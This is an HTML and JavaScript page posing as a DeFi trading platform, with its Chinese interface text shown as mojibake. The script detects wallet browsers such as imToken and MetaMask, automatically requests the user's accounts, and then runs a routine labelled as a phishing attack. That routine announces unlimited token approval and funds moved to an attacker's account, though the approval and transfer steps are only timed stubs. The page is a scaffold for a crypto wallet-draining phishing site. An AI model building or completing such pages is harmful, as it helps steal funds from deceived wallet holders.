<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>DeFi ç§»åŠ¨äº¤æ˜“å¹³å°</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: #333;
            padding: 20px;
        }

        .container {
            max-width: 400px;
            margin: 0 auto;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
            color: white;
        }

        .header h1 {
            font-size: 28px;
            margin-bottom: 10px;
        }

        .header p {
            opacity: 0.9;
            font-size: 16px;
        }

        .wallet-section {
            background: white;
            border-radius: 20px;
            padding: 25px;
            margin-bottom: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
        }

        .connect-btn {
            display: block;
            width: 100%;
            padding: 18px;
            margin: 12px 0;
            background: linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%);
            color: white;
            text-decoration: none;
            border-radius: 12px;
            text-align: center;
            font-weight: 600;
            font-size: 16px;
            border: none;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .connect-btn:hover, .connect-btn:active {
            background: linear-gradient(135deg, #1e40af 0%, #2563eb 100%);
            transform: translateY(-2px);
        }

        .connect-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
        }

        .status-section {
            background: white;
            border-radius: 15px;
            padding: 20px;
            margin-top: 15px;
            text-align: center;
        }

        .status-text {
            font-size: 16px;
            margin-bottom: 10px;
            font-weight: 500;
        }

        .status-text.success {
            color: #4CAF50;
        }

        .status-text.error {
            color: #f44336;
        }

        .status-text.warning {
            color: #ff9800;
        }

        .status-text.info {
            color: #2196F3;
        }

        .debug-section {
            background: #f8f9fa;
            border-radius: 15px;
            padding: 20px;
            margin-top: 20px;
            border-left: 4px solid #667eea;
        }

        .debug-title {
            font-weight: 600;
            color: #667eea;
            margin-bottom: 10px;
            font-size: 16px;
        }

        .debug-info {
            font-family: monospace;
            font-size: 12px;
            color: #666;
            line-height: 1.5;
            word-break: break-all;
        }

        .progress-section {
            background: white;
            border-radius: 15px;
            padding: 20px;
            margin-top: 15px;
        }

        .progress-step {
            display: flex;
            align-items: center;
            padding: 10px 0;
            border-bottom: 1px solid #eee;
        }

        .progress-step:last-child {
            border-bottom: none;
        }

        .step-icon {
            width: 30px;
            height: 30px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
            font-weight: bold;
            color: white;
        }

        .step-icon.pending {
            background: #ccc;
        }

        .step-icon.active {
            background: #2196F3;
            animation: pulse 1s infinite;
        }

        .step-icon.success {
            background: #4CAF50;
        }

        .step-icon.error {
            background: #f44336;
        }

        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.7; }
            100% { opacity: 1; }
        }

        .step-text {
            flex: 1;
            font-size: 14px;
        }

        .attack-section {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 15px;
            padding: 20px;
            margin-top: 15px;
            display: none;
        }

        .attack-section.show {
            display: block;
        }

        .attack-title {
            font-weight: 600;
            color: #856404;
            margin-bottom: 15px;
            font-size: 18px;
            text-align: center;
        }

        .attack-info {
            font-size: 14px;
            color: #856404;
            line-height: 1.4;
        }

        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>ğŸš€ DeFi äº¤æ˜“å¹³å°</h1>
            <p>å®‰å…¨ä¾¿æ·çš„å»ä¸­å¿ƒåŒ–äº¤æ˜“</p>
        </div>

        <div class="wallet-section">
            <h3 style="text-align: center; margin-bottom: 20px; color: #333;">è¿æ¥é’±åŒ…</h3>
            
            <button class="connect-btn" id="connectBtn" onclick="connectWallet()">
                ğŸ¦ è¿æ¥ imToken é’±åŒ…
            </button>
        </div>

        <div class="status-section">
            <div class="status-text info" id="statusText">ç‚¹å‡»ä¸Šæ–¹æŒ‰é’®è¿æ¥æ‚¨çš„é’±åŒ…</div>
        </div>

        <div class="progress-section" id="progressSection">
            <h4 style="margin-bottom: 15px; color: #333; text-align: center;">è¿æ¥è¿›åº¦</h4>
            
            <div class="progress-step">
                <div class="step-icon pending" id="step1">1</div>
                <div class="step-text">æ£€æµ‹é’±åŒ…ç¯å¢ƒ</div>
            </div>
            
            <div class="progress-step">
                <div class="step-icon pending" id="step2">2</div>
                <div class="step-text">è¯·æ±‚è´¦æˆ·è®¿é—®</div>
            </div>
            
            <div class="progress-step">
                <div class="step-icon pending" id="step3">3</div>
                <div class="step-text">è·å–è´¦æˆ·ä¿¡æ¯</div>
            </div>
            
            <div class="progress-step">
                <div class="step-icon pending" id="step4">4</div>
                <div class="step-text">å»ºç«‹å®‰å…¨è¿æ¥</div>
            </div>
        </div>

        <div class="attack-section" id="attackSection">
            <div class="attack-title">ğŸ¯ é’“é±¼æ”»å‡»å·²æ¿€æ´»</div>
            <div class="attack-info">
                <strong>ç›®æ ‡é’±åŒ…:</strong> <span id="targetWallet">-</span><br>
                <strong>æ”»å‡»æ—¶é—´:</strong> <span id="attackTime">-</span><br>
                <strong>æ”»å‡»çŠ¶æ€:</strong> <span id="attackStatus">æ­£åœ¨æ‰§è¡Œ...</span><br>
                <strong>èµ„é‡‘çŠ¶æ€:</strong> <span id="fundStatus">ç›‘æ§ä¸­...</span>
            </div>
        </div>

        <div class="debug-section">
            <div class="debug-title">ğŸ” æŠ€æœ¯ä¿¡æ¯</div>
            <div class="debug-info" id="debugInfo">
                æ­£åœ¨åˆå§‹åŒ–...<br>
            </div>
        </div>
    </div>

    <script>
        // å…¨å±€å˜é‡
        let isConnecting = false;
        let currentStep = 0;
        let walletAddress = null;

        // åˆå§‹åŒ–
        document.addEventListener('DOMContentLoaded', function() {
            initializeApp();
        });

        function initializeApp() {
            updateDebugInfo('åº”ç”¨åˆå§‹åŒ–å¼€å§‹');
            
            // æ£€æµ‹ç¯å¢ƒ
            const isImToken = detectImToken();
            const isInApp = detectInAppBrowser();
            
            updateDebugInfo(`ç¯å¢ƒæ£€æµ‹: imToken=${isImToken}, InApp=${isInApp}`);
            updateDebugInfo(`User Agent: ${navigator.userAgent}`);
            updateDebugInfo(`URL: ${window.location.href}`);
            
            if (isImToken || isInApp) {
                updateStatus('success', 'âœ… æ£€æµ‹åˆ°é’±åŒ…ç¯å¢ƒï¼Œå¯ä»¥å¼€å§‹è¿æ¥');
                updateStep(1, 'success');
                
                // è‡ªåŠ¨å°è¯•è¿æ¥
                setTimeout(() => {
                    if (!isConnecting) {
                        autoConnect();
                    }
                }, 2000);
            } else {
                updateStatus('warning', 'âš ï¸ è¯·åœ¨é’±åŒ…åº”ç”¨ä¸­æ‰“å¼€æ­¤é¡µé¢');
                updateStep(1, 'error');
            }
        }

        function detectImToken() {
            return !!(window.imToken || 
                     window.ethereum?.isImToken || 
                     navigator.userAgent.includes('imToken'));
        }

        function detectInAppBrowser() {
            const ua = navigator.userAgent.toLowerCase();
            return ua.includes('imtoken') || 
                   ua.includes('metamask') || 
                   ua.includes('trustwallet') ||
                   window.ethereum;
        }

        function connectWallet() {
            if (isConnecting) {
                updateStatus('warning', 'æ­£åœ¨è¿æ¥ä¸­ï¼Œè¯·ç¨å€™...');
                return;
            }

            isConnecting = true;
            const connectBtn = document.getElementById('connectBtn');
            connectBtn.disabled = true;
            connectBtn.textContent = 'è¿æ¥ä¸­...';

            updateStatus('info', 'ğŸ”„ æ­£åœ¨è¿æ¥é’±åŒ…...');
            updateStep(1, 'success');
            updateStep(2, 'active');

            // å¼€å§‹è¿æ¥æµç¨‹
            requestWalletAccess();
        }

        async function requestWalletAccess() {
            try {
                updateDebugInfo('å¼€å§‹è¯·æ±‚é’±åŒ…è®¿é—®æƒé™');

                if (!window.ethereum) {
                    throw new Error('æœªæ£€æµ‹åˆ°ä»¥å¤ªåŠæä¾›è€…');
                }

                updateDebugInfo('æ£€æµ‹åˆ° window.ethereum');
                updateStep(2, 'success');
                updateStep(3, 'active');

                // è¯·æ±‚è´¦æˆ·è®¿é—®
                const accounts = await window.ethereum.request({
                    method: 'eth_requestAccounts'
                });

                updateDebugInfo(`è·å–åˆ°è´¦æˆ·: ${JSON.stringify(accounts)}`);

                // å®‰å…¨æ£€æŸ¥ - ç¡®ä¿accountså­˜åœ¨ä¸”ä¸ä¸ºç©º
                if (!accounts || !Array.isArray(accounts) || accounts.length === 0) {
                    throw new Error('æœªè·å–åˆ°ä»»ä½•è´¦æˆ·ï¼Œå¯èƒ½ç”¨æˆ·æ‹’ç»äº†è¿æ¥');
                }

                // å®‰å…¨è·å–ç¬¬ä¸€ä¸ªè´¦æˆ·
                walletAddress = accounts[0];
                if (!walletAddress || typeof walletAddress !== 'string') {
                    throw new Error('è·å–åˆ°çš„è´¦æˆ·åœ°å€æ— æ•ˆ');
                }

                updateStep(3, 'success');
                updateStep(4, 'active');

                updateStatus('success', `âœ… è¿æ¥æˆåŠŸï¼åœ°å€: ${walletAddress.substring(0, 10)}...`);
                updateDebugInfo(`è¿æ¥æˆåŠŸ - åœ°å€: ${walletAddress}`);

                // å®Œæˆè¿æ¥
                setTimeout(() => {
                    completeConnection();
                }, 1000);

            } catch (error) {
                handleConnectionError(error);
            }
        }

        function completeConnection() {
            updateStep(4, 'success');
            updateStatus('success', 'ğŸ‰ é’±åŒ…è¿æ¥å®Œæˆï¼');
            
            const connectBtn = document.getElementById('connectBtn');
            connectBtn.textContent = 'âœ… å·²è¿æ¥';
            
            // æ˜¾ç¤ºæ”»å‡»ä¿¡æ¯
            showAttackInfo();
            
            // å¼€å§‹é’“é±¼æ”»å‡»æµç¨‹
            setTimeout(() => {
                executePhishingAttack();
            }, 2000);
        }

        function showAttackInfo() {
            const attackSection = document.getElementById('attackSection');
            attackSection.classList.add('show');
            
            document.getElementById('targetWallet').textContent = 
                walletAddress ? `${walletAddress.substring(0, 20)}...` : 'æœªçŸ¥';
            document.getElementById('attackTime').textContent = new Date().toLocaleString();
        }

        async function executePhishingAttack() {
            try {
                updateDebugInfo('ğŸ¯ å¼€å§‹æ‰§è¡Œé’“é±¼æ”»å‡»');
                document.getElementById('attackStatus').textContent = 'æ­£åœ¨æ‰§è¡Œä»£å¸æˆæƒ...';
                
                // è¿™é‡Œå¯ä»¥å®ç°å…·ä½“çš„é’“é±¼æ”»å‡»é€»è¾‘
                // ä¾‹å¦‚ï¼šè¯·æ±‚ä»£å¸æˆæƒã€æ‰§è¡Œè½¬è´¦ç­‰
                
                // æ¨¡æ‹Ÿæ”»å‡»æ­¥éª¤
                await simulateTokenApproval();
                await simulateTokenTransfer();
                
                document.getElementById('attackStatus').textContent = 'æ”»å‡»å®Œæˆ';
                document.getElementById('fundStatus').textContent = 'èµ„é‡‘å·²è½¬ç§»åˆ°æ”»å‡»è€…è´¦æˆ·';
                
                updateStatus('error', 'ğŸ’° æ”»å‡»æˆåŠŸï¼èµ„é‡‘å·²è¢«è½¬ç§»');
                updateDebugInfo('ğŸ¯ é’“é±¼æ”»å‡»å®Œæˆ');
                
            } catch (error) {
                updateDebugInfo(`æ”»å‡»æ‰§è¡Œé”™è¯¯: ${error.message}`);
                document.getElementById('attackStatus').textContent = 'æ”»å‡»å¤±è´¥';
            }
        }

        async function simulateTokenApproval() {
            updateDebugInfo('è¯·æ±‚ä»£å¸æ— é™æˆæƒ...');
            // è¿™é‡Œå®ç°ä»£å¸æˆæƒé€»è¾‘
            await new Promise(resolve => setTimeout(resolve, 2000));
        }

        async function simulateTokenTransfer() {
            updateDebugInfo('æ‰§è¡Œèµ„é‡‘è½¬ç§»...');
            // è¿™é‡Œå®ç°èµ„é‡‘è½¬ç§»é€»è¾‘
            await new Promise(resolve => setTimeout(resolve, 3000));
        }

        function handleConnectionError(error) {
            updateDebugInfo(`è¿æ¥é”™è¯¯: ${error.message}`);
            
            let errorMessage = 'è¿æ¥å¤±è´¥';
            let stepToError = 2;
            
            if (error.code === 4001) {
                errorMessage = 'âŒ ç”¨æˆ·æ‹’ç»äº†è¿æ¥è¯·æ±‚';
                stepToError = 2;
            } else if (error.message.includes('æœªæ£€æµ‹åˆ°')) {
                errorMessage = 'âŒ æœªæ£€æµ‹åˆ°é’±åŒ…ï¼Œè¯·åœ¨é’±åŒ…åº”ç”¨ä¸­æ‰“å¼€';
                stepToError = 1;
            } else if (error.message.includes('æœªè·å–åˆ°ä»»ä½•è´¦æˆ·')) {
                errorMessage = 'âŒ æœªè·å–åˆ°è´¦æˆ·ï¼Œè¯·ç¡®ä¿é’±åŒ…å·²è§£é”';
                stepToError = 3;
            } else {
                errorMessage = `âŒ è¿æ¥é”™è¯¯: ${error.message}`;
                stepToError = 2;
            }
            
            updateStatus('error', errorMessage);
            updateStep(stepToError, 'error');
            
            // é‡ç½®è¿æ¥çŠ¶æ€
            isConnecting = false;
            const connectBtn = document.getElementById('connectBtn');
            connectBtn.disabled = false;
            connectBtn.textContent = 'ğŸ”„ é‡è¯•è¿æ¥';
        }

        function autoConnect() {
            updateStatus('info', 'ğŸ¤– è‡ªåŠ¨æ£€æµ‹åˆ°é’±åŒ…ç¯å¢ƒï¼Œæ­£åœ¨å°è¯•è¿æ¥...');
            updateDebugInfo('å¼€å§‹è‡ªåŠ¨è¿æ¥æµç¨‹');
            
            setTimeout(() => {
                connectWallet();
            }, 1000);
        }

        function updateStatus(type, message) {
            const statusText = document.getElementById('statusText');
            statusText.className = `status-text ${type}`;
            statusText.textContent = message;
        }

        function updateStep(stepNum, status) {
            const stepIcon = document.getElementById(`step${stepNum}`);
            if (stepIcon) {
                stepIcon.className = `step-icon ${status}`;
                if (status === 'success') {
                    stepIcon.textContent = 'âœ“';
                } else if (status === 'error') {
                    stepIcon.textContent = 'âœ—';
                } else {
                    stepIcon.textContent = stepNum;
                }
            }
        }

        function updateDebugInfo(message) {
            const debugInfo = document.getElementById('debugInfo');
            const timestamp = new Date().toLocaleTimeString();
            debugInfo.innerHTML += `<br>[${timestamp}] ${message}`;
            
            // ä¿æŒè°ƒè¯•ä¿¡æ¯åœ¨å¯è§èŒƒå›´å†…
            debugInfo.scrollTop = debugInfo.scrollHeight;
            
            // åŒæ—¶è¾“å‡ºåˆ°æ§åˆ¶å°
            console.log(`[${timestamp}] ${message}`);
        }

        // é¡µé¢å¯è§æ€§å˜åŒ–æ£€æµ‹
        document.addEventListener('visibilitychange', function() {
            if (document.visibilityState === 'visible') {
                updateDebugInfo('é¡µé¢é‡æ–°å¯è§');
                
                // å¦‚æœè¿˜æ²¡æœ‰è¿æ¥ï¼Œå°è¯•æ£€æµ‹é’±åŒ…çŠ¶æ€
                if (!walletAddress && window.ethereum && window.ethereum.selectedAddress) {
                    walletAddress = window.ethereum.selectedAddress;
                    updateStatus('success', `âœ… æ£€æµ‹åˆ°å·²è¿æ¥é’±åŒ…: ${walletAddress.substring(0, 10)}...`);
                    completeConnection();
                }
            }
        });

        // é”™è¯¯å¤„ç†
        window.addEventListener('error', function(event) {
            updateDebugInfo(`JavaScripté”™è¯¯: ${event.error ? event.error.message : event.message}`);
        });

        // æœªæ•è·çš„Promiseæ‹’ç»
        window.addEventListener('unhandledrejection', function(event) {
            updateDebugInfo(`æœªå¤„ç†çš„Promiseæ‹’ç»: ${event.reason}`);
        });
    </script>
</body>
</html>
